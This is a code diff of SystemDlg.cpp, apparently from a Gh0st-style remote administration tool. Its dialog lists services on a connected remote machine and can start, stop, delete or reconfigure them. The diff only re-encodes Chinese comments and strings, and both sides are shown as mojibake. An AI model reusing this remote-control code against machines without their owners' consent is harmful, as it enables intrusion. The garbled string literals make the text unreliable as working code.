@@ -1,4 +1,4 @@
-// SystemDlg.cpp : implementation file
+ï»¿// SystemDlg.cpp : implementation file
 //
 
 #include "stdafx.h"
@@ -14,14 +14,14 @@ static char THIS_FILE[] = __FILE__;
 
 enum
 {
-	COMMAND_SSLIST = 1,				// ·şÎñÁĞ±í
-	COMMAND_STARTSERVERICE,			// Æô¶¯·şÎñ
-	COMMAND_STOPSERVERICE,			// Í£Ö¹·şÎñ
-	COMMAND_DELETESERVERICE,		// É¾³ı·şÎñ
-	COMMAND_CREATSERVERICE,			// ´´½¨·şÎñ
-	COMMAND_AUTOSERVERICE,			// ×ÔÆô¶¯
-	COMMAND_HANDSERVERICE,			// ÊÖ¶¯
-	COMMAND_DISABLESERVERICE		// ½ûÖ¹
+	COMMAND_SSLIST = 1,				// æœåŠ¡åˆ—è¡¨
+	COMMAND_STARTSERVERICE,			// å¯åŠ¨æœåŠ¡
+	COMMAND_STOPSERVERICE,			// åœæ­¢æœåŠ¡
+	COMMAND_DELETESERVERICE,		// åˆ é™¤æœåŠ¡
+	COMMAND_CREATSERVERICE,			// åˆ›å»ºæœåŠ¡
+	COMMAND_AUTOSERVERICE,			// è‡ªå¯åŠ¨
+	COMMAND_HANDSERVERICE,			// æ‰‹åŠ¨
+	COMMAND_DISABLESERVERICE		// ç¦æ­¢
 };
 
 /////////////////////////////////////////////////////////////////////////////
@@ -35,7 +35,7 @@ CSerManager::CSerManager(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext 
 	Sleep(100);
 	m_iocpServer = pIOCPServer;
 	m_pContext = pContext;
-	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_SERT));  //´°¿ÚÍ¼±ê
+	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_SERT));  //çª—å£å›¾æ ‡
 }
 
 
@@ -55,7 +55,7 @@ void CSerManager::OnReceiveComplete()
 		ShowServiceList();
 		break;
 	default:
-		// ´«Êä·¢ÉúÒì³£Êı¾İ
+		// ä¼ è¾“å‘ç”Ÿå¼‚å¸¸æ•°æ®
 		break;
 	}
 }
@@ -104,9 +104,9 @@ void CSerManager::ShowServiceList()
 		ServiceState = StartType + lstrlen(StartType) + 1;
 		BinaryPathName = ServiceState + lstrlen(ServiceState) + 1;
 
-		if(!strcmp(StartType,"½ûÓÃ"))
+		if(!strcmp(StartType,"ç¦ç”¨"))
 			stmk=1;
-		else if(!strcmp(ServiceState,"Æô¶¯"))
+		else if(!strcmp(ServiceState,"å¯åŠ¨"))
 			stmk=0;
 		else
 			stmk=2;
@@ -140,18 +140,18 @@ BOOL CSerManager::OnInitDialog()
 	memset(&sockAddr, 0, sizeof(sockAddr));
 	int nSockAddrLen = sizeof(sockAddr);
 	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
-	str.Format("\\\\%s - ·şÎñ¹ÜÀí", bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
+	str.Format("\\\\%s - æœåŠ¡ç®¡ç†", bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
 	SetWindowText(str);
 	
-//	m_tab.InsertItem(0, "·şÎñ¹ÜÀí");
+//	m_tab.InsertItem(0, "æœåŠ¡ç®¡ç†");
 
 	m_list_server.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT|LVS_EX_UNDERLINEHOT |LVS_EX_SUBITEMIMAGES| LVS_EX_GRIDLINES);
-	m_list_server.InsertColumn(0, "ÏÔÊ¾Ãû³Æ", LVCFMT_LEFT, 220);
-	m_list_server.InsertColumn(1, "ÃèÊö", LVCFMT_LEFT, 260);
-	m_list_server.InsertColumn(2, "·şÎñÃû³Æ", LVCFMT_LEFT, 100);
-	m_list_server.InsertColumn(3, "ÀàĞÍ", LVCFMT_LEFT, 60);
-	m_list_server.InsertColumn(4, "×´Ì¬", LVCFMT_LEFT, 60);
-	m_list_server.InsertColumn(5, "ÎÄ¼şÂ·¾¶", LVCFMT_LEFT, 300);
+	m_list_server.InsertColumn(0, "æ˜¾ç¤ºåç§°", LVCFMT_LEFT, 220);
+	m_list_server.InsertColumn(1, "æè¿°", LVCFMT_LEFT, 260);
+	m_list_server.InsertColumn(2, "æœåŠ¡åç§°", LVCFMT_LEFT, 100);
+	m_list_server.InsertColumn(3, "ç±»å‹", LVCFMT_LEFT, 60);
+	m_list_server.InsertColumn(4, "çŠ¶æ€", LVCFMT_LEFT, 60);
+	m_list_server.InsertColumn(5, "æ–‡ä»¶è·¯å¾„", LVCFMT_LEFT, 300);
 
 	m_ImgList.Create(16, 16,ILC_COLOR8|ILC_MASK,15,1);
 	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_ICONSERT0));
@@ -222,7 +222,7 @@ void CSerManager::OnRclickList(NMHDR* pNMHDR, LRESULT* pResult)
 		CPoint	p;
 		GetCursorPos(&p);
 
-//		pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);//¼ÓÉÏÕâ¾äÃ»ÓĞÓÒ¼üÍ¼±ê
+//		pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);//åŠ ä¸Šè¿™å¥æ²¡æœ‰å³é”®å›¾æ ‡
 		CXTPCommandBars::TrackPopupMenu(pM,TPM_RIGHTBUTTON,p.x,p.y,this);
 		*pResult = 0;
 //	}
@@ -273,7 +273,7 @@ void CSerManager::OnMenuStop()
  	int		nItem = m_list_server.GetNextItem(-1,LVNI_SELECTED);
  	tSerName = m_list_server.GetItemText(nItem,2);
  	ZeroMemory(sername,sizeof(sername));
-	strcat(sername, tSerName);//»ñÈ¡·şÎñÃû
+	strcat(sername, tSerName);//è·å–æœåŠ¡å
 
 	int nPacketLength = (strlen(sername) + 1);;
 	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
@@ -294,7 +294,7 @@ void CSerManager::OnMenuDel()
  	int		nItem = m_list_server.GetNextItem(-1,LVNI_SELECTED);
  	tSerName = m_list_server.GetItemText(nItem,2);
  	ZeroMemory(sername,sizeof(sername));
-	strcat(sername, tSerName);//»ñÈ¡·şÎñÃû
+	strcat(sername, tSerName);//è·å–æœåŠ¡å
 
 	int nPacketLength = (strlen(sername) + 1);;
 	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
@@ -319,7 +319,7 @@ void CSerManager::OnMenuStartAuto()
  	int		nItem = m_list_server.GetNextItem(-1,LVNI_SELECTED);
  	tSerName = m_list_server.GetItemText(nItem,2);
  	ZeroMemory(sername,sizeof(sername));
-	strcat(sername, tSerName);//»ñÈ¡·şÎñÃû
+	strcat(sername, tSerName);//è·å–æœåŠ¡å
 	int nPacketLength = (strlen(sername) + 1);;
 	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
 	lpBuffer[0] = COMMAND_AUTOSERVERICE;
@@ -339,7 +339,7 @@ void CSerManager::OnMenuStartManager()
  	int		nItem = m_list_server.GetNextItem(-1,LVNI_SELECTED);
  	tSerName = m_list_server.GetItemText(nItem,2);
  	ZeroMemory(sername,sizeof(sername));
-	strcat(sername, tSerName);//»ñÈ¡·şÎñÃû
+	strcat(sername, tSerName);//è·å–æœåŠ¡å
 
 	int nPacketLength = (strlen(sername) + 1);;
 	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
@@ -360,7 +360,7 @@ void CSerManager::OnMenuStartDisable()
  	int		nItem = m_list_server.GetNextItem(-1,LVNI_SELECTED);
  	tSerName = m_list_server.GetItemText(nItem,2);
  	ZeroMemory(sername,sizeof(sername));
-	strcat(sername, tSerName);//»ñÈ¡·şÎñÃû
+	strcat(sername, tSerName);//è·å–æœåŠ¡å
 
 	int nPacketLength = (strlen(sername) + 1);;
 	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
